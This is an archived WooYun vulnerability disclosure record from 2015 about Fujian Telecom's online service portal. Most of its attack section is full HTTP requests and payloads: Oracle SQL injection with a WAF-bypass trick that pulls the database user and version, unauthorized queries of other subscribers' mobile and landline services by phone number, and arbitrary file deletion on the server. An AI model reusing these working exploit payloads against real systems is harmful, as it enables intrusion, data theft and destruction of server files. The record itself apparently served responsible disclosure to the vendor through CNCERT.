{"id": 28824, "wybug_id": "wooyun-2015-0132424", "wybug_title": "某省电信网厅漏洞合集(Oracle注入\\越权查询他人手机固话业务\\删除任意文件)", "wybug_corp": "中国电信", "wybug_author": "超威蓝猫", "wybug_date": "2015-08-07 17:02", "wybug_open_date": "2015-09-25 13:50", "wybug_type": "系统/服务运维配置不当", "wybug_level": "高", "wybug_rank_0": "16", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["注入"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-08-07：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-08-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-08-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-08-31：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-09-10：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-09-25：\t细节向公众公开  简要描述： 某省电信网厅(**.189.cn)漏洞合集(Oracle注入\\越权查询他人手机固话业务\\删除任意文件) 详细说明：  福建电信网上营业厅 http://fj.189.cn[1- Oracle注入]使用福建地区的帐号登录后，点击我的服务-宽带资源查询，输入手机号后点击下一步，可以看到这么一条HTTP请求：\n\n\n\n这里的 ADDRNAME 参数可注入:\n\n经测试，WAF会匹配如下关键词\nand orselect\n使用/**/代替其中的空格(%20)即可绕过WAF；该WAF还会将传入的<>转为&lt;&gt;，在部分SQL语句中，可以使用BETWEEN AND等来替代大于小于这些运算符。我们可以写个脚本来盲注(此处演示仅证明可行性)：\nPOST /ServiceOrderAjax.do HTTP/1.1Origin: http://fj.189.cnContent-Length: 181Accept-Language: zh-CN,zh;q=0.8Accept-Encoding: gzip,deflateHost: fj.189.cnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 QIHU 360EEAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7Connection: closeX-Requested-With: XMLHttpRequestPragma: no-cacheCache-Control: no-cacheReferer: http://fj.189.cn/service/transaction_new/lan/queryResources.jspContent-Type: application/x-www-form-urlencodedCookie: method=queryAddrByNameInPage&PARENTADDRID=1058224&AREACODE=591&ADDRNAME='/**/AND ascii(substr((select/**/user from dual),1,1)) between 81/**/and 85/**/AND '%'='&FROMCODE=1&ENDCODE=2\n传入真时返回地区数据，传入假时返回\"未查询到任何结果\"\n\n\n\n通过该方法获取到当前用户名长度为3, ascii码分别为83 82 77, 对应\"SRM\"。我们也可以通过XML报错的方式来获取数据：\nPOST /ServiceOrderAjax.do HTTP/1.1Origin: http://fj.189.cnContent-Length: 245Accept-Language: zh-CN,zh;q=0.8Accept-Encoding: gzip,deflateHost: fj.189.cnAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 QIHU 360EEAccept-Charset: ISO-8859-15,utf-8;q=0.7,*;q=0.7Connection: closeX-Requested-With: XMLHttpRequestPragma: no-cacheCache-Control: no-cacheReferer: http://fj.189.cn/service/transaction_new/lan/queryResources.jspContent-Type: application/x-www-form-urlencodedCookie: method=queryAddrByNameInPage&PARENTADDRID=1058224&AREACODE=591&ADDRNAME='/**/AND 1=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||(utl_raw.cast_to_raw((SELECT/**/banner from v$version where rownum=1))))) FROM DUAL)/**/AND '%'='&FROMCODE=1&ENDCODE=30\n\n\n\n得到4F7261636C652044617461626173652031306720456E74657270726973652045646974696F6E2052656C656173652031302E322E302E332E30202D2036346269解码后为Oracle Database 10g Enterprise Edition Release 10.2.0.3.0 - 64bi(不知道为什么少了一个t，求指导)\n\n\n\n'/**/AND 1=(SELECT/**/UPPER(XMLType(CHR(60)||CHR(58)||((SELECT/**/user from dual where rownum=1)))) FROM DUAL)/**/AND '%'='\n可得到当前用户名确实为SRM。\n\n当前用户权限类型为PLUSTRACE哦 ._.\n\n[2- 越权查询他人手机固话业务]直接发包吧.. 实在懒到不想截图了 ._.注: 只有上面那个oracle注入不需要登录后的cookie，后面两个漏洞需要。查询任意福建电信手机号的主套餐:\nPOST /ServiceOrderAjax.do HTTP/1.1Host: fj.189.cnProxy-Connection: keep-aliveContent-Length: 61Accept: application/json, text/javascript, */*; q=0.01Origin: http://fj.189.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 QIHU 360EEContent-Type: application/x-www-form-urlencodedReferer: http://fj.189.cn/service/transaction_new/tianyiself/prodrevision/zyyw.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: isLogin=logined; fj_citycode=0591; ticket=***此处应打码***; method=setEsuringIn&number=18065917777&phonetype=50&city=0591\n\n\n\n\n查询任意福建电信手机号已开通的可选包:\nPOST /service2/actions/Package.action?showPackageAttr= HTTP/1.1Host: fj.189.cnProxy-Connection: keep-aliveContent-Length: 35Accept: application/json, text/javascript, */*; q=0.01Origin: http://fj.189.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 QIHU 360EEContent-Type: application/x-www-form-urlencodedReferer: http://fj.189.cn/service/transaction_new/tianyiself/prodrevision/zyyw.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: isLogin=logined; fj_citycode=0591; ticket=ticket=***此处应打码***; OBJECTNUM=18065917777&OBJECTTYPE=50\n\n\n\n\n查询福建电信任意固话号码类型、开通时间、所有业务：\nPOST /service2/actions/Package.action?showPackageAttr= HTTP/1.1Host: fj.189.cnProxy-Connection: keep-aliveContent-Length: 31Accept: application/json, text/javascript, */*; q=0.01Origin: http://fj.189.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 QIHU 360EEContent-Type: application/x-www-form-urlencodedReferer: http://fj.189.cn/service/transaction_new/tianyiself/prodrevision/zyyw.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ticket=***此处应有打码***; OBJECTNUM=26999999&OBJECTTYPE=1\n\n\n(图上第一个开通时间就是电话开户的时间)\n\n\n\n\n\n[3- 删除任意文件]在 业务办理-固定电话新装 中上传图片后点击删除：\n\n\nPOST /ServiceOrderAjax.do HTTP/1.1Host: fj.189.cnProxy-Connection: keep-aliveContent-Length: 116Accept: */*Origin: http://fj.189.cnX-Requested-With: XMLHttpRequestUser-Agent: Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.152 Safari/537.36 QIHU 360EEContent-Type: application/x-www-form-urlencodedReferer: http://fj.189.cn/service/transaction_new/phone/telephone_add.jspAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: ticket=0wv77gFD21inaa0mqaHr;method=delfile&saveFileName=1438937023523.jpg&saveFilePath=%2Fservice%2Ftransaction_new%2Flan%2Fuploadfile%2Ffile%2F\n我们试试删除服务器上的其他文件:\n\n天辣！真的删掉了\n\n\n\n   漏洞证明：  如上。   修复方案：  ._. 嘻嘻   版权声明：转载请注明来源 超威蓝猫@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：12  确认时间：2015-08-11 13:48 厂商回复： CNVD确认所述情况,已经转由CNCERT向中国电信集团公司通报,由其后续协调网站管理部门处置. 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-08-07 20:22 |    \t\t金枪银矛小霸王 \t\t\t( 普通白帽子  |\t\t\t        Rank:103 漏洞数:25        | 不会挖洞洞的猿猿不是好学生)\t\t \n  叼叼叼    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 12, "Ranks": null}